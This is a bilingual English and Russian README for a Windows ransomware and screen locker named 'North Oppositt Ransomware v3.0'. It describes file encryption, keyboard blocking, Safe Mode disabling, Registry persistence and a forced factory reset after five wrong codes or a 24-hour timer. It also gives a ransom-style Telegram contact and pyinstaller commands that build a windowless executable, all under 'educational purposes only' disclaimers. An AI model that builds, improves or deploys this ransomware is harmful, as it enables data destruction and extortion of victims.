HELLOCKER

North Oppositt Ransomware v3.0

⚠️ FOR EDUCATIONAL & RESEARCH PURPOSES ONLY ⚠️

This software is a proof-of-concept ransomware/windows locker created for cybersecurity education, malware analysis training, and testing in isolated virtual environments.

DO NOT RUN ON REAL SYSTEMS WITHOUT PERMISSION. THE AUTHOR IS NOT RESPONSIBLE FOR ANY DAMAGE.

Features

🔒 Full-screen lock – Blocks all windows, stays on top of everything

⌨️ Keyboard blocker – Only digits (0-9), Backspace and Enter work

🔊 100% volume lock – Forces maximum system volume, cannot be lowered

🔐 AES-128 encryption – Encrypts user files with Fernet (cryptography library)

⏰ 24-hour timer – Countdown displayed in real-time

💀 System reset – Factory reset Windows after 5 wrong attempts

🎵 Background music – Plays looped sound.wav file (if provided)

💻 System overload – CPU/RAM/Disk load to slow down the PC

🔄 Startup persistence – Adds to Windows autorun (Registry + Startup folder)

🗑️ Self-deletion – Removes itself after successful decryption

🛡️ Safe mode disable – Disables Windows Safe Mode while running

How It Works

Launch the executable (requires Administrator rights)

Background encryption starts immediately – all user files are encrypted with AES-128

Full-screen lock appears with timer and code input field

User must enter the correct decryption code

If correct → files are decrypted, system restored, program self-destructs

If wrong (5 times) → Windows factory reset is triggered

If timer expires → Windows factory reset is triggered


Default Settings

SECRET_CODE = "192837465" – Decryption password
MAX_ATTEMPTS = 5 – Wrong attempts before reset
TIMER_SECONDS = 24 * 60 * 60 – 24 hours

Contact for Decryption: Telegram @societyvoice

How to Use (for research)

Install dependencies:
pip install cryptography keyboard pycaw comtypes psutil pyinstaller

Prepare sound file (optional):
Place sound.wav in the same folder as the script.

Compile to EXE:
pyinstaller --onefile --noconsole --name "NorthOppositt" --add-data "sound.wav;." --hidden-import=_cffi_backend --collect-all cryptography start.py

Run in virtual machine:
Copy NorthOppositt.exe to a Windows VM
Run as Administrator
Enter code 192837465 to decrypt

Legal Disclaimer

This project is for educational purposes only. Do not use this software for illegal activities. The author assumes no liability for any misuse or damage caused by this software.

Credits: Created by iaefeel & gflm



North Oppositt Ransomware v3.0

⚠️ ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ ⚠️

Данное программное обеспечение является proof-of-concept вирусом-блокировщиком/шифровальщиком, созданным для изучения кибербезопасности, тренировки по анализу вредоносного ПО и тестирования в изолированных виртуальных средах.

НЕ ЗАПУСКАЙТЕ НА РЕАЛЬНЫХ СИСТЕМАХ БЕЗ РАЗРЕШЕНИЯ. АВТОР НЕ НЕСЁТ ОТВЕТСТВЕННОСТИ ЗА ЛЮБОЙ УЩЕРБ.

Возможности

🔒 Полноэкранная блокировка – Перекрывает все окна, всегда поверх

⌨️ Блокировка клавиатуры – Работают только цифры (0-9), Backspace и Enter

🔊 Фиксация громкости 100% – Принудительно устанавливает максимум

🔐 AES-128 шифрование – Шифрует файлы пользователя через Fernet

⏰ Таймер 24 часа – Обратный отсчёт в реальном времени

💀 Сброс системы – Factory reset Windows после 5 неверных попыток

🎵 Фоновая музыка – Зацикленное воспроизведение sound.wav

💻 Нагрузка на систему – Загрузка CPU/RAM/диска для замедления ПК

🔄 Автозагрузка – Добавляется в автозапуск Windows

🗑️ Самоудаление – Удаляет себя после успешной расшифровки

🛡️ Отключение безопасного режима – Отключает Safe Mode на время работы


Как это работает

Запуск исполняемого файла (требуются права администратора)

Фоновое шифрование начинается мгновенно — все файлы шифруются AES-128

Появляется полноэкранная блокировка с таймером и полем ввода кода

Пользователь должен ввести правильный код расшифровки

Если код верный → файлы расшифровываются, система восстанавливается, программа самоудаляется

Если код неверный (5 раз) → запускается сброс Windows

Если таймер истёк → запускается сброс Windows


Настройки по умолчанию

SECRET_CODE = "192837465" – Пароль для расшифровки
MAX_ATTEMPTS = 5 – Попыток до сброса
TIMER_SECONDS = 24 * 60 * 60 – 24 часа

Контакт для расшифровки: Telegram @societyvoice

Инструкция по использованию

Установи зависимости:
pip install cryptography keyboard pycaw comtypes psutil pyinstaller

Подготовь звуковой файл (опционально):
Положи sound.wav в папку со скриптом.

Скомпилируй в EXE:
pyinstaller --onefile --noconsole --name "NorthOppositt" --add-data "sound.wav;." --hidden-import=_cffi_backend --collect-all cryptography start.py

Запусти в виртуальной машине:
Скопируй NorthOppositt.exe в виртуалку с Windows
Запусти от имени администратора
Введи код 192837465 для расшифровки

Юридическое предупреждение

Данный проект создан только в образовательных целях. Не используйте это ПО для незаконной деятельности. Автор не несёт ответственности за любой ущерб, причинённый данным программным обеспечением.

Авторы: Создано iaefeel & gflm
